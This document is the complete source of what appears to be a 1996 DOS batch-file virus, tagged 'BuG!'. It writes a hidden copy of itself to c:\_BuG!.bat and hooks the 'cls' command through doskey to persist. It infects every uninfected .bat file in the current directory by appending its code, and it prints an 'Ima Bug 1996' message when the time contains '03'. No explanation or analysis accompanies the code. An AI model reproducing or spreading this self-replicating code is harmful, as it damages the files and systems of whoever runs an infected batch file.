::**** HOST ****
@echo off%_BuG!%
if '%1=='BuG! goto BuG!%2
if '%1=='!BuG! cls
if exist c:\_BuG!.bat goto BuG!g
if not exist %0.bat goto BuG!e
find "BuG!"<%0.bat>c:\_BuG!.bat
attrib c:\_BuG!.bat +h
:BuG!g
command /c c:\_BuG! BuG! v
doskey cls=c:\_BuG! !BuG!>nul
echo.|time|find "03">nul.BuG!
if errorlevel 1 goto BuG!e
echo%_BuG!% Ima Bug 1996
echo%_BuG!%   __o
echo%_BuG!%  /--\
goto BuG!e
:BuG!v
for %%a in (*.bat) do call c:\_BuG! BuG! i %%a 
exit BuG!
:BuG!i
find "BuG!"<%3>nul
if not errorlevel 1 goto BuG!e
type c:\_BuG!.bat>>%3
exit BuG!
:BuG!e
